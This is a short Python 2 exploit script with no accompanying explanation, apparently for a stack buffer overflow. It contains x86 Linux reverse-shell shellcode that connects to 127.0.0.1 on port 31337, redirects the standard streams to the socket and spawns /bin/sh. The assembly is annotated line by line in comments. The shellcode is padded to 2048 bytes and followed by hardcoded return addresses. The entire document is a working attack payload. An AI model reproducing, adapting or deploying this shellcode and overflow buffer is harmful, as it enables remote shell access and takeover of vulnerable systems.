from struct import pack
shellcode=('\x55\x89\xe5\x83\xec\x14\x31\xc0\x89\x44\x24\x08\x83\xc0\x02\x66\x89\x04\x24\x66\xc7\x44\x24\x02\x7a\x69\xc1\xe0\x17\x83\xc0\x7f\x89\x44\x24\x04'+
#push	%ebp
#mov	%esp,%ebp
#sub	$0x20,%esp
#xor	%eax,%eax
#mov	%eax,8(%esp)		addr.sin_zero
#movw	$0x697a,0x2(%esp)	addr.sin_port=31337
#add	$0x2,%eax
#mov	%eax,(%esp)		addr.sin_family=AF_INET
#shl	$0x17,%eax
#add	$0x7f,%eax
#mov	%eax,0x4(%esp)		addr.sin_addr.s_addr=127.0.0.1
'\x31\xc0\x50\x40\x50\x89\xc3\x40\x50\x6a\x66\x58\x89\xe1\xcd\x80\x83\xc4\x0c\x89\x44\x24\x10'+
#xor	%eax,%eax
#push	%eax			socket(AF_INET,SOCK_STREAM,"0")
#inc	%eax
#push	%eax			socket(AF_INET,"SOCK_STREAM",0)
#mov	%eax,%ebx
#inc	%eax
#push	%eax			socket("AF_INET",SOCK_STREAM,0)
#movl	$102,%eax
#leal	-32(%ebp),%ecx
#int	$0x80			call socketcall
#add	$0xc,%esp
#mov	%eax,16(%ebp)		store socketfd
'\x89\xe1\x6a\x10\x58\x50\x51\xff\x71\x10\x6a\x66\x58\x31\xdb\x83\xc3\x03\x89\xe1\xcd\x80\x83\xc4\x0c'+
#mov	%esp,%ecx
#mov	$0x10,%eax
#push	%eax		conect(sockfd,&addr,"sizeof(addr)")
#push	%ecx		conect(sockfd,"&addr",sizeof(addr))
#pushl	16(%ecx)	conect("sockfd",&addr,sizeof(addr))
#push	$0x66		call socketcall
#pop	%eax
#xor	%ebx,%ebx
#add	$0x3,%ebx
#mov	%esp,%ecx
#int	$0x80
#add	$0xc,%esp
'\x6a\x3f\x8b\x04\x24\x8b\x5c\x24\x14\x31\xc9\xcd\x80\x8b\x04\x24\x41\xcd\x80\x58\x41\xcd\x80'+
#push	$0x3f
#mov	(%esp),%eax		call dup2(socketfd,stdin)
#mov	0x14(%esp),%ebx
#xor	%ecx,%ecx
#int	$0x80
#mov	(%esp),%eax		call dup2(socketfd,stdout)
#inc	%ecx
#int	$0x80
#pop	%eax			call dup2(socketfd,stderr)
#inc	%ecx
#int	0x80
'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80')
#mov	$0xb,%eax		call execve
#cltd
#push	%edx
#push	$0x68732f2f
#push	$0x6e69622f
#mov	%esp,%ebx
#push	%edx
#push	%ebx
#mov	%esp,%ecx
#int	0x80

print shellcode+'\xaa'*(2048-len(shellcode))+pack('<I',0xbffea7e8-0x810)+pack('<I',0xbffea7e8+0x4)
